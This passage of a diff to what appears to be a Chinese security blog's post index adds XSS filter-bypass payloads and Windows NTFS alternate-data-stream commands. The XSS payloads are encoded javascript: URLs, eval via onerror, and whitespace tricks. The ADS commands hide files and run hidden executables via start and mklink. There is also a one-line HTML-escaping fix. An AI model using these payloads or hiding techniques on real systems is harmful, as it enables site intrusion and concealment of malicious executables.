利用location --&gt;</span></span></span><br><span class="line"><span class="tag"><span class="string">&lt;img src=1 onerror=location='</span><span class="attr">javascript:</span>%<span class="attr">61</span>%<span class="attr">6C</span>%<span class="attr">65</span>%<span class="attr">72</span>%<span class="attr">74</span>%<span class="attr">28</span>%<span class="attr">31</span>%<span class="attr">29</span>'&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">location</span>=<span class="string">'javascript:\x61\x6C\x65\x72\x74\x28\x31\x29'</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">location</span>=<span class="string">"javascr"</span>+"<span class="attr">ipt:</span>"+"%<span class="attr">61</span>%<span class="attr">6C</span>%<span class="attr">65</span>%<span class="attr">72</span>%<span class="attr">74</span>%<span class="attr">28</span>%<span class="attr">31</span>%<span class="attr">29</span>"&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 括号被过滤 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">"window.onerror=eval;throw'=alert\x281\x29';"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- onerror=被过滤 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>     =<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span></span></span><br><span class="line"><span class="tag">=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 属性被转换为大写 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 编码后被检测 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="修复方案-5"><a href="#修复方案-5" class="headerlink" title="修复方案"></a>修复方案</h1><p>在输入输出位置进行HTML实体转义</p>
+]]></content>
+  </entry>
+  <entry>
     <title>UploadFile</title>
     <url>/2021/01/07/UploadFile/</url>
     <content><![CDATA[<h1 id="前端js验证绕过"><a href="#前端js验证绕过" class="headerlink" title="前端js验证绕过"></a>前端js验证绕过</h1><p>Web前端对上传文件的后缀名进行限制，导致文件php文件无法上传。</p>
@@ -588,7 +752,18 @@
 <td align="left"><code>&lt;?php phpinfo();?&gt;</code></td>
 </tr>
 </tbody></table>
+<h1 id="利用ADS隐藏文件"><a href="#利用ADS隐藏文件" class="headerlink" title="利用ADS隐藏文件"></a>利用ADS隐藏文件</h1><h2 id="写"><a href="#写" class="headerlink" title="写"></a>写</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#将字符写到dispaly.txt:hid.txt中</span></span><br><span class="line"><span class="comment">#dispaly.txt为宿主文件。图形界面下可见</span></span><br><span class="line"><span class="comment">#hid.txt寄生到宿主文件dispaly.txt上，图形界面下不可见</span></span><br><span class="line">C:\&gt;echo xxx &gt;&gt;dispaly.txt:hid.txt</span><br></pre></td></tr></table></figure>
+
+<h2 id="查"><a href="#查" class="headerlink" title="查"></a>查</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\&gt;dir /r</span><br><span class="line">C:\&gt;notepad display.txt:hid.txt</span><br></pre></td></tr></table></figure>
+
+<h2 id="文件寄生"><a href="#文件寄生" class="headerlink" title="文件寄生"></a>文件寄生</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#多种寄生方案</span></span><br><span class="line"><span class="comment">#type命令和echo命令不同，type命令是将已经存在的一个文件， 用交换数据流的方式寄生到另外一个文件或文件夹上，dispaly文件夹是一个空文件夹，寄生hid.txt后，文件夹大小显示仍然是0。</span></span><br><span class="line"><span class="comment">#寄生到文件上</span></span><br><span class="line">C:\&gt;type hid.txt &gt;&gt;dispaly.txt:hid.txt</span><br><span class="line"><span class="comment">#寄生到文件夹上</span></span><br><span class="line">C:\&gt;type hid.txt &gt;&gt;dispaly:hid.txt</span><br><span class="line"><span class="comment">#寄生到磁盘上 (寄生到E盘根目录)</span></span><br><span class="line">C:\&gt;type hid.txt &gt;&gt;E:\:hid.txt</span><br><span class="line"><span class="comment">#寄生到可执行文件上</span></span><br><span class="line">C:\&gt;type hid.txt &gt;&gt;dispaly.exe:hid.txt</span><br></pre></td></tr></table></figure>
+
+<h2 id="隐藏图片文件的利用"><a href="#隐藏图片文件的利用" class="headerlink" title="隐藏图片文件的利用"></a>隐藏图片文件的利用</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#此处举寄生到可执行文件的方案</span></span><br><span class="line">C:\&gt;type hid.txt &gt;&gt;dispaly.exe:hid.txt</span><br><span class="line"><span class="comment">#使用系统自带的图画程序mspaint开寄生在可执行文件中的那张图片</span></span><br><span class="line">C:\&gt;mspaint dispaly.exe:hid.txt</span><br></pre></td></tr></table></figure>
+
+<h2 id="隐藏可执行文件的利用"><a href="#隐藏可执行文件的利用" class="headerlink" title="隐藏可执行文件的利用"></a>隐藏可执行文件的利用</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#xp系统(取一种寄生方案，其他同理)</span></span><br><span class="line">C:\&gt;type hid.exe &gt;&gt;C:\:hid.exe</span><br><span class="line">C:\&gt;start C:\:hid.exe</span><br><span class="line"></span><br><span class="line"><span class="comment">#win7以后的系统</span></span><br><span class="line"><span class="comment">#需要创建符号链接，这个符号链接是可见的（当然可以使用其他手段隐藏这个符号链接），并且这个符号链接创建出来后不能复制到其他地方，只能在创建的那个位置使用命令行方式调用（鼠标双击会报错）。</span></span><br><span class="line">E:\&gt;type hid.exe &gt;&gt;E:\:hid.exe</span><br><span class="line"><span class="comment">#在C盘的根目录中创建一个符号链接文件hid.exe，链接到E盘根目录中寄生的交换数据流可执行文件hid.exe上。</span></span><br><span class="line"><span class="comment">#注意此处为链接C盘的:hid.exe数据流文件</span></span><br><span class="line">E:\&gt;mklink C:\hid.exe E:\:hid.exe</span><br><span class="line">E:\&gt;C:\hid.exe</span><br></pre></td></tr></table></figure>
+
 <p><a href="https://www.jianshu.com/p/7842ee248621" target="_blank" rel="noopener">NTFS ADS的前世今生</a></p>
+<p><a href="https://www.qingsword.com/qing/812.html" target="_blank" rel="noopener">利用NTFS交换数据流隐藏文件</a></p>
 ]]></content>
   </entry>
   <entry>
